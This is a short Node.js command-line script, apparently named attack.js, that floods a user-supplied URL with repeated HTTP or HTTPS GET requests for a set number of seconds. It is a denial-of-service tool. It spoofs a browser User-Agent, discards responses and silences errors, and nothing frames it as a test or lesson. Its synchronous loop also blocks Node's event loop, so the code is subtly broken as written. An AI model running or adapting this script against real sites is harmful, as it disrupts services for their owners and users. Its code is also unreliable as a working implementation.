const http = require('http');
const https = require('https');
const { URL } = require('url');

const [,, target, duration] = process.argv;

if (!target || !duration) {
  console.log('Usage: node attack.js <url> <seconds>');
  process.exit(1);
}

const url = new URL(target);
const endTime = Date.now() + parseInt(duration) * 1000;
const isHttps = url.protocol === 'https:';
const client = isHttps ? https : http;

function flood() {
  while (Date.now() < endTime) {
    const options = {
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname + url.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Connection': 'keep-alive',
      }
    };

    const req = client.request(options, res => {
      res.on('data', () => {}); // Keep connection open
    });

    req.on('error', () => {}); // Ignore errors
    req.end();
  }

  console.log('Flood ended.');
}

flood();
